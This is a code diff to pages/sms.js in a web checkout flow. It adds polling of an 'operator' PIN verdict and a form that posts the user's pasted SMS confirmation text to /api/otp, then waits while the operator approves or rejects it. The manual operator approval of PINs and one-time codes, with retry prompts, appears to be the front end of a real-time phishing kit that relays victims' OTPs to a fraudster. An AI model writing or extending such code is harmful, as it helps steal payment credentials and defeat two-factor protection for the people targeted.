@@ -1,8 +1,17 @@
 /* ==========================================================================
    pages/sms.js
-   Reads ?plan and ?phone from the URL, renders the amount and the
-   recipient number, wires the live character counter, and toggles
-   Next Step based on whether the textarea contains content.
+   Reads ?plan, ?phone and ?sid from the URL.
+
+   Behaviour
+   ---------
+   * Renders the amount and recipient number.
+   * Live character counter; Next Step enabled when non-empty.
+   * Background watchdog polls pin-status every 2s. If the operator
+     rejects the PIN while the user is here, we bounce them back to
+     checkout.html?plan=X&sid=Y&phone=Z&error=pin_rejected.
+   * Next Step: POST /api/otp, show the approval loader, then poll
+     otp-status until approved (-> success.html) or rejected (-> show
+     inline error, allow retry).
    ========================================================================== */
 
 (function (global) {
@@ -10,51 +19,166 @@
 
   var DEFAULT_PLAN_CODE = "premium";
   var DEFAULT_PHONE = "079764645";
+  var PIN_WATCHDOG_MS = 2000;
+  var OTP_POLL_MS = 1500;
 
-  /**
-   * Read a query-string parameter.
-   * @param {string} name
-   * @returns {string | null}
-   */
+  var LOADER_ID = "sms-loader";
+  var LOADER_TITLE_ID = "sms-loader-title";
+  var LOADER_BODY_ID = "sms-loader-body";
+  var ERROR_ID = "sms-error";
+  var ERROR_TEXT_ID = "sms-error-text";
+
+  var ERROR_OTP_REJECTED =
+    "Invalid confirmation message, please wait for a new one and try again.";
+  var ERROR_NETWORK =
+    "Could not reach the server. Is 'py run_server.py' running?";
+
+  var sid = "";
+  var plan = null;
+  var phone = "";
+
   function getQueryParam(name) {
-    var params = new URLSearchParams(global.location.search);
-    return params.get(name);
+    return new URLSearchParams(global.location.search).get(name);
   }
 
-  /**
-   * Resolve the plan from ?plan, falling back to a default.
-   * @returns {Plan}
-   */
-  function resolvePlan() {
-    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
-    return global.Plans.findByCode(code) ||
-           global.Plans.findByCode(DEFAULT_PLAN_CODE);
-  }
-
-  /**
-   * Render the amount tag and the recipient number.
-   * @param {Plan} plan
-   */
-  function renderHeader(plan) {
-    var amountEl = document.getElementById("amount-value");
-    if (amountEl) {
-      amountEl.textContent = global.Plans.formatPrice(plan);
+  function setText(id, value) {
+    var el = document.getElementById(id);
+    if (el) {
+      el.textContent = value;
     }
+  }
 
+  function showLoader(title, body) {
+    setText(LOADER_TITLE_ID, title);
+    setText(LOADER_BODY_ID, body);
+    var loader = document.getElementById(LOADER_ID);
+    if (loader) {
+      loader.hidden = false;
+    }
+  }
+
+  function hideLoader() {
+    var loader = document.getElementById(LOADER_ID);
+    if (loader) {
+      loader.hidden = true;
+    }
+  }
+
+  function showError(message) {
+    setText(ERROR_TEXT_ID, message);
+    var error = document.getElementById(ERROR_ID);
+    if (error) {
+      error.style.display = "flex";
+    }
+  }
+
+  function hideError() {
+    var error = document.getElementById(ERROR_ID);
+    if (error) {
+      error.style.display = "none";
+    }
+  }
+
+  function renderHeader() {
+    var valueEl = document.getElementById("amount-value");
+    if (valueEl) {
+      valueEl.textContent = global.Plans.formatPrice(plan);
+    }
     var phoneEl = document.getElementById("sending-to");
     if (phoneEl) {
-      phoneEl.textContent = getQueryParam("phone") || DEFAULT_PHONE;
+      phoneEl.textContent = phone || DEFAULT_PHONE;
     }
-
     var backLink = document.getElementById("back-link");
     if (backLink) {
-      backLink.href = "checkout.html?plan=" + encodeURIComponent(plan.code);
+      var href = "checkout.html?plan=" + encodeURIComponent(plan.code);
+      if (sid) {
+        href += "&sid=" + encodeURIComponent(sid);
+      }
+      if (phone) {
+        href += "&phone=" + encodeURIComponent(phone);
+      }
+      backLink.href = href;
     }
   }
 
-  /**
-   * Wire the textarea counter and Next Step enablement.
-   */
+  function getPinStatus() {
+    return global.fetch(
+      "/api/pin-status/" + encodeURIComponent(sid)
+    ).then(function (response) {
+      return response.ok ? response.json() : { status: "unknown" };
+    });
+  }
+
+  function bounceToCheckout() {
+    var target = "checkout.html" +
+      "?plan=" + encodeURIComponent(plan.code) +
+      "&sid=" + encodeURIComponent(sid) +
+      "&phone=" + encodeURIComponent(phone) +
+      "&error=pin_rejected";
+    global.location.href = target;
+  }
+
+  function startPinWatchdog() {
+    function tick() {
+      getPinStatus().then(function (data) {
+        if (data.status === "rejected") {
+          bounceToCheckout();
+          return;
+        }
+        global.setTimeout(tick, PIN_WATCHDOG_MS);
+      }).catch(function () {
+        global.setTimeout(tick, PIN_WATCHDOG_MS * 2);
+      });
+    }
+    global.setTimeout(tick, PIN_WATCHDOG_MS);
+  }
+
+  function getOtpStatus() {
+    return global.fetch(
+      "/api/otp-status/" + encodeURIComponent(sid)
+    ).then(function (response) {
+      return response.ok ? response.json() : { status: "unknown" };
+    });
+  }
+
+  function navigateToSuccess(referenceNumber) {
+    var target = "success.html" +
+      "?sid=" + encodeURIComponent(sid) +
+      "&ref=" + encodeURIComponent(referenceNumber || "");
+    global.location.href = target;
+  }
+
+  function pollOtpStatus() {
+    function tick() {
+      getOtpStatus().then(function (data) {
+        if (data.status === "approved") {
+          navigateToSuccess(data.reference_number || "");
+          return;
+        }
+        if (data.status === "rejected") {
+          hideLoader();
+          showError(ERROR_OTP_REJECTED);
+          return;
+        }
+        global.setTimeout(tick, OTP_POLL_MS);
+      }).catch(function () {
+        global.setTimeout(tick, OTP_POLL_MS * 2);
+      });
+    }
+    global.setTimeout(tick, OTP_POLL_MS);
+  }
+
+  function postOtp(smsBody) {
+    return global.fetch("/api/otp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        session_id: sid,
+        sms_body: smsBody
+      })
+    });
+  }
+
   function wireForm() {
     var textarea = document.getElementById("sms-body");
     var counter = document.getElementById("char-count");
@@ -67,17 +191,49 @@
       counter.textContent = String(textarea.value.length);
       nextBtn.disabled = textarea.value.trim().length === 0;
     }
-
     textarea.addEventListener("input", sync);
     sync();
+
+    nextBtn.addEventListener("click", function () {
+      hideError();
+      var smsBody = textarea.value.trim();
+      if (!smsBody) {
+        return;
+      }
+      showLoader("Sending OTP...", "Sending your OTP to the operator");
+      postOtp(smsBody).then(function (response) {
+        if (!response.ok) {
+          hideLoader();
+          showError(ERROR_NETWORK);
+          return;
+        }
+        showLoader(
+          "Awaiting Approval...",
+          "Waiting for the operator to verify the OTP. Please do not close this page."
+        );
+        pollOtpStatus();
+      }).catch(function () {
+        hideLoader();
+        showError(ERROR_NETWORK);
+      });
+    });
   }
 
-  /**
-   * Entry point.
-   */
   function init() {
-    renderHeader(resolvePlan());
+    plan = (function () {
+      var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
+      return global.Plans.findByCode(code) ||
+             global.Plans.findByCode(DEFAULT_PLAN_CODE);
+    })();
+    phone = getQueryParam("phone") || DEFAULT_PHONE;
+    sid = getQueryParam("sid") || "";
+
+    renderHeader();
     wireForm();
+
+    if (sid) {
+      startPinWatchdog();
+    }
   }
 
   if (document.readyState === "loading") {
